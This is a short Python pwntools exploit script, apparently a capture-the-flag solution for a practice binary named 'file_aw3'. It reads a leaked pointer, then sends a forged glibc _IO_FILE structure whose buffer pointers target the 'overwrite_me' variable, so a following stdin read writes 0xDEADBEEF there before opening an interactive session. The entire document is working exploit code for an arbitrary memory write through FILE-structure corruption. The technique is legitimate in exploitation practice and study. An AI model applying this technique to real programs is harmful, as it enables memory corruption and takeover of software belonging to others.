#file_aw3.py
from pwn import *

p = process("./file_aw3")
e = ELF("./file_aw3")
print p.recvuntil("PTR: ")
fp = int(p.recvuntil("\n").strip("\n"),16)
print hex(fp)
print p.sendlineafter("Addr: ", str(fp))

overwrite_me = e.symbols['overwrite_me']
log.info("overwrite_me : "+hex(overwrite_me))

# _FLAG = 0xfbad2484
payload = p64(0x00000000fbad2488)

payload += p64(0) # _IO_read_ptr
payload += p64(0) # _IO_read_end
payload += p64(0) # _IO_read_base

payload += p64(0) # _IO_write_base 
payload += p64(0) # _IO_write_ptr 
payload += p64(0) # _IO_write_end 

# _IO_buf_base <- overwrite_me (+4)-> _IO_buf_end
payload += p64(0x60108c) # _IO_buf_base
payload += p64(0x60108c+4) # _IO_buf_end

payload += p64(0)
payload += p64(0)
payload += p64(0)
payload += p64(0)
payload += p64(0) 
payload += p64(0) # stdin

pause()
print p.sendlineafter("Value: ", str(payload))

p.sendline(p32(0xDEADBEEF))
p.interactive()